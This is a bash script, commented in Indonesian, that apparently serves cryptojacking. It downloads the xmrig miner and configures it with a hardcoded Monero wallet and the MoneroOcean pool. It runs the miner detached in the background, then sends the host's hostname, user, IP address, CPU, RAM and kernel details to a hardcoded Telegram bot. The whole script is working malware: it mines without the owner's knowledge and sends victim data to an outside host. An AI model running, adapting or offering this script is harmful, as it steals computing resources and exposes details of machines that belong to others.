#!/usr/bin/env bash

set -euo pipefail

### === Konfigurasi (dari skrip PHP asli) ===
WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
TELEGRAM_TOKEN="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
TELEGRAM_CHATID="5104210301"

# URL xmrig tarball (sumber asli)
XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"

# Lokasi instalasi default: direktori tempat skrip dijalankan
BASE_DIR="$(pwd)"
INSTALL_DIR="$BASE_DIR/moneroocean"

# Nama file sementara
TARBALL="$BASE_DIR/xmrig.tar.gz"

### === Helper ===
log() { printf '%s %s\n' "[$(date '+%Y-%m-%d %H:%M:%S')]" "$*"; }

run_cmd() {
  # wrapper: jalankan perintah dan tampilkan ketika error
  if ! eval "$@"; then
    log "ERROR: command failed: $*"
    exit 1
  fi
}

require_cmd() {
  if ! command -v "$1" >/dev/null 2>&1; then
    log "ERROR: required command '$1' not found. Install it first."
    exit 1
  fi
}

# Cek kalau dijalankan sebagai root -> berikan peringatan tapi tetap lanjut (opsional)
if [ "$(id -u)" -eq 0 ]; then
  log "Peringatan: Anda menjalankan skrip sebagai root. Direkomendasikan menjalankan sebagai user non-root."
  # Uncomment baris berikut jika ingin memaksa exit ketika root:
  # exit 1
fi

# Pilih downloader: curl atau wget
DL_CMD=""
if command -v curl >/dev/null 2>&1; then
  DL_CMD="curl -fSL -o"
  log "Downloader: curl"
elif command -v wget >/dev/null 2>&1; then
  DL_CMD="wget -qO"
  log "Downloader: wget"
else
  log "ERROR: Tidak ada curl atau wget. Install salah satunya."
  exit 1
fi

# Pastikan tar ada
require_cmd tar
# jq optional (lebih aman untuk edit JSON); jika tidak ada, gunakan sed fallback
JQ_PRESENT=0
if command -v jq >/dev/null 2>&1; then
  JQ_PRESENT=1
  log "jq: tersedia (akan digunakan untuk mengedit JSON)"
else
  log "jq: tidak ditemukan (akan gunakan sed sebagai fallback untuk modifikasi JSON sederhana)"
fi

### === Persiapan direktori ===
log "Persiapan direktori: $INSTALL_DIR"
rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

### === Download xmrig tarball ===
log "Mengunduh xmrig dari: $XMRIG_URL"
# contoh: curl -fSL -o /path/xmrig.tar.gz URL
if ! $DL_CMD "$TARBALL" "$XMRIG_URL"; then
  log "ERROR: gagal mengunduh $XMRIG_URL"
  exit 1
fi
log "File diunduh: $TARBALL"

### === Ekstrak ===
log "Mengekstrak ke: $INSTALL_DIR"
tar -xzf "$TARBALL" -C "$INSTALL_DIR"
rm -f "$TARBALL"
log "Ekstrak selesai."

### === Siapkan config.json ===
CONFIG_PATH="$INSTALL_DIR/config.json"
EXAMPLE_PATH="$INSTALL_DIR/config.json.example"

# Jika example ada, salin; jika tidak, buat default sederhana
if [ -f "$EXAMPLE_PATH" ]; then
  cp -f "$EXAMPLE_PATH" "$CONFIG_PATH" || true
fi

# Jika tidak ada config sama sekali, buat config sederhana (minimal)
if [ ! -f "$CONFIG_PATH" ]; then
  cat > "$CONFIG_PATH" <<'EOF'
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [
    {
      "url": "gulf.moneroocean.stream:10128",
      "user": "YOUR_WALLET",
      "pass": "HOSTNAME",
      "keepalive": true
    }
  ]
}
EOF
fi

# Update config: url, user (wallet), pass (hostname), set log-file null if ada
HOSTNAME="$(hostname)"
if [ "$JQ_PRESENT" -eq 1 ]; then
  tmpfile="$(mktemp)"
  jq --arg url "gulf.moneroocean.stream:10128" \
     --arg user "$WALLET" \
     --arg pass "$HOSTNAME" \
     '.pools[0].url = $url | .pools[0].user = $user | .pools[0].pass = $pass | .["log-file"] = null' \
     "$CONFIG_PATH" > "$tmpfile" && mv "$tmpfile" "$CONFIG_PATH"
else
  # Fallback sed-based replacements (mungkin tidak 100% robust untuk semua config)
  # Ganti "url": "..." pertama dengan pool url
  sed -i -E '0,/"url": *"[^"]*"/s//"url": "gulf.moneroocean.stream:10128"/' "$CONFIG_PATH" 2>/dev/null || true
  # Ganti "user": "..." pertama dengan wallet
  sed -i -E "0,/"'\"user\": *"[^"]*"'/s//\"user\": \"$WALLET\"/" "$CONFIG_PATH" 2>/dev/null || true
  # Ganti "pass": "..." pertama dengan hostname
  sed -i -E "0,/"'\"pass\": *"[^"]*"'/s//\"pass\": \"$HOSTNAME\"/" "$CONFIG_PATH" 2>/dev/null || true
  # set log-file null if present
  sed -i -E 's/"log-file": *[^,]*,/"log-file": null,/' "$CONFIG_PATH" 2>/dev/null || true
fi
log "Konfigurasi disiapkan: $CONFIG_PATH"

### === Pastikan xmrig executable ada ===
# cari binary xmrig di folder (beberapa distribusi tarball taruh di subfolder)
XMRIG_BIN=""
# preferensi: ./xmrig di install_dir root atau find executable
if [ -x "$INSTALL_DIR/xmrig" ]; then
  XMRIG_BIN="$INSTALL_DIR/xmrig"
else
  # cari file bernama xmrig di instal dir
  XMRIG_BIN="$(find "$INSTALL_DIR" -maxdepth 2 -type f -name xmrig -perm /111 2>/dev/null | head -n1 || true)"
fi

if [ -z "$XMRIG_BIN" ]; then
  log "ERROR: Binary xmrig tidak ditemukan atau tidak executable di $INSTALL_DIR"
  log "Isi $INSTALL_DIR:"
  ls -la "$INSTALL_DIR" || true
  exit 1
fi

log "Binary xmrig: $XMRIG_BIN"

### === Jalankan xmrig di background (daemonize) ===
# Gunakan nohup atau setsid untuk detach; pastikan tidak menggunakan root-only paths
log "Menjalankan xmrig di background..."
# ubah working dir ke install dir
cd "$INSTALL_DIR"
# pastikan executable bit
chmod +x "$XMRIG_BIN" || true

# jalankan, redirect output ke file log di home user
LOGFILE="$INSTALL_DIR/xmrig.log"
# Start command (non-blocking)
nohup "$XMRIG_BIN" --config="$CONFIG_PATH" > "$LOGFILE" 2>&1 &

sleep 1
# Ambil PID xmrig
XMRIG_PIDS="$(pgrep -f "$XMRIG_BIN" || true)"

if [ -z "$XMRIG_PIDS" ]; then
  log "ERROR: xmrig tidak terlihat berjalan. Periksa $LOGFILE"
else
  log "xmrig berjalan dengan PID(s):"
  echo "$XMRIG_PIDS"
fi

### === Kumpulkan info sistem untuk notif ===
WHOAMI="$(whoami)"
RAM_INFO="$(free -h | awk '/Mem:/ {print $2 \" (used: \" $3 \", free: \" $4 \")\"}')"
CPU_CORES="$(lscpu 2>/dev/null | awk -F: '/^CPU\(s\)/ {gsub(/ /,\"\",$2); print $2 \" cores\" }' || true)"
if [ -z "$CPU_CORES" ]; then
  CPU_CORES="$(nproc 2>/dev/null || true) cores"
fi
CPU_THREADS="$(lscpu 2>/dev/null | awk -F: '/^Thread/ {gsub(/ /,\"\",$2); print $2 \" threads/core\" }' || true)"
UNAME_INFO="$(uname -a)"
IP_ADDR="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
CURRENT_PATH="$(pwd)"

### === Kirim notifikasi ke Telegram ===
send_telegram() {
  local token="$1"
  local chatid="$2"
  local text="$3"
  # gunakan curl untuk POST
  curl -sS -X POST "https://api.telegram.org/bot${token}/sendMessage" \
       -d "chat_id=${chatid}" \
       -d "text=${text}" \
       -d "parse_mode=HTML" \
       -d "disable_web_page_preview=true" >/dev/null || true
}

# compose message (HTML)
PID_BLOCK="$(echo "$XMRIG_PIDS" | sed 's/^/<code>/; s/$/<\/code>/')"
MSG="$(cat <<EOF
✅ <b>XMRig dijalankan sukses</b>
🖥️ <b>Hostname</b>: <code>$HOSTNAME</code>
👤 <b>User</b>: $WHOAMI
🧠 <b>CPU</b>: $CPU_CORES | $CPU_THREADS
📦 <b>RAM</b>: $RAM_INFO
🌐 <b>IP</b>: $IP_ADDR
🔧 <b>System</b>: <code>$UNAME_INFO</code>

⛏️ <b>PID</b>:
<code>$XMRIG_PIDS</code>

📁 <b>Path</b>: <code>$CURRENT_PATH</code>
EOF
)"

if [ -n "$TELEGRAM_TOKEN" ] && [ -n "$TELEGRAM_CHATID" ]; then
  log "Mengirim notifikasi ke Telegram..."
  send_telegram "$TELEGRAM_TOKEN" "$TELEGRAM_CHATID" "$MSG"
  log "Notifikasi Telegram dikirim (atau request dikirim)."
else
  log "Token/chatid Telegram kosong, melewatkan notif."
fi

log "Instalasi selesai. Lihat log: $LOGFILE"
